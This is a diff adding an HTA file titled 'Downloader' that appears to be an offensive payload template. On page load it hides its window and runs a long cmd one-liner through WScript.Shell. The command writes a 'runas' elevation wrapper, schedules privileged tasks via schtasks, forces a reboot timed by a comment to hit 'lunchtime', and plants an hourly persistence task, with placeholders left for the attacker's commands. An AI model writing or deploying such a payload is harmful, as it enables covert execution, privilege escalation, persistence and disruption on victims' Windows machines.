@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="SI"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="normal"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+
+<script type="text/javascript">
+
+function executepayload() {
+	window.resizeTo(0,0);
+	blah= new ActiveXObject('Wscript.Shell');
+
+// Be sure to adjust the "+ 1" to something more like "+ 15"
+// And change the time on kjc2 (the reboot) to say, lunchtime
+
+	blah.Run('cmd /c echo ^@echo Set objShell = CreateObject(^\"Shell.Application^\") ^> ^%temp^%\\sudo.tmp.vbs > c:\\temp\\sudo.cmd & echo ^@echo args = Right(^"^%^*^", (Len(^"%^*^") - Len(^"^%^1^"))) ^>^> ^%temp^%\\sudo.tmp.vbs >> c:\\temp\\sudo.cmd & echo ^@echo objShell.ShellExecute ^"^%^1^", args, ^"^", ^"runas^" ^>^> ^%temp^%\\sudo.tmp.vbs >> c:\\temp\\sudo.cmd & echo @cscript %temp%\\sudo.tmp.vbs >> c:\\temp\\sudo.cmd & echo for /F "tokens=1-3 delims=:." ^%^%a in ("%time%") do (set Hour=^%^%a > c:\\temp\\time.bat & echo set Minute=^%^%b >> c:\\temp\\time.bat & echo set Seconds=%%c) >> c:\\temp\\time.bat & echo if ^%Minute^% equ 08 (set Minute=8) >> c:\\temp\\time.bat & echo if ^%Minute^% equ 09 (set Minute=9) >> c:\\temp\\time.bat & echo set /A newTime=Hour*60 + Minute + {{{MINUTES HERE}}} >> c:\\temp\\time.bat & echo set /A Hour=newTime/60, Minute=newTime^%^%60 >> c:\\temp\\time.bat & echo if ^%Hour^% gtr 23 (set Hour=0) ELSE (IF ^%Hour^% lss 10 set Hour=0^%Hour^%) >> c:\\temp\\time.bat & echo if ^%Minute^% lss 10 set Minute=0^%Minute^% >> c:\\temp\\time.bat & echo Set TaskTime=^%Hour^%:^%Minute^% >> c:\\temp\\time.bat & echo schtasks /create /tn task1 /tr "c:\\temp\\sudo cmd /c ren {{{PRIVILEGED TASK YOU WANT TO RUN PRE-REBOOT HERE}}}" /sc once /st ^%tasktime^% /f >> c:\\temp\\time.bat & c:\\temp\\time.bat & schtasks /create /tn task2 /tr "shutdown /r" /sc once /st {{{REBOOT TIME}}} & schtasks /create /sc hourly /tn task3 /tr "{{{POST-REBOOT TASK HERE}}}" /f', 0);
+
+}
+
+setTimeout(executepayload, 1000); 
+</script>
+
+</head>
+<body>
+</body>
+</html>
